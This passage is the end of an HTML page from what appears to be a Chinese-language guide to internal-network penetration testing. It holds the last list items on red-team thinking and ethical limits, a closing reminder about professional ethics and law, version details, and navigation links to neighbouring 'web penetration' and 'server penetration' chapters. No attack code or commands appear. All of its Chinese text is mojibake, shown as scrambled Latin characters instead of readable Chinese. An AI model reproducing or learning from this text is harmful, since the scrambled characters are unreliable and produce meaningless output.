<li><strong>å¯¹æŠ—æ€ç»´</strong>: ç†è§£è“é˜Ÿé˜²å¾¡ï¼Œæå‡çº¢é˜Ÿèƒ½åŠ›</li>
<li><strong>é“å¾·åº•çº¿</strong>: æŠ€æœ¯æ˜¯ä¸ºäº†å®‰å…¨é˜²å¾¡ï¼Œè€Œéæ¶æ„ç ´å</li>
</ol>
<p>è®°ä½ï¼šä¼˜ç§€çš„å†…ç½‘æ¸—é€å·¥ç¨‹å¸ˆä¸ä»…æ˜¯æŠ€æœ¯ä¸“å®¶ï¼Œæ›´æ˜¯å…·æœ‰èŒä¸šé“å¾·å’Œæ³•å¾‹æ„è¯†çš„å®‰å…¨ä»ä¸šè€…ã€‚</p>
<hr />
<p><strong>æ–‡æ¡£ç‰ˆæœ¬</strong>: v2.0
<strong>æœ€åæ›´æ–°</strong>: 2024å¹´1æœˆ
<strong>ç»´æŠ¤è€…</strong>: Security Research Team
<strong>åé¦ˆé‚®ç®±</strong>: security@example.com (è¯·æ›¿æ¢ä¸ºå®é™…é‚®ç®±)</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../ç¼–ç¨‹/security/webæ¸—é€.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../ç¼–ç¨‹/security/æœåŠ¡å™¨æ¸—é€.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../ç¼–ç¨‹/security/webæ¸—é€.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../ç¼–ç¨‹/security/æœåŠ¡å™¨æ¸—é€.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../theme/segmentit.umd.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../theme/searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->
        <script src="../../theme/pagetoc.js"></script>



    </div>
    </body>
</html>

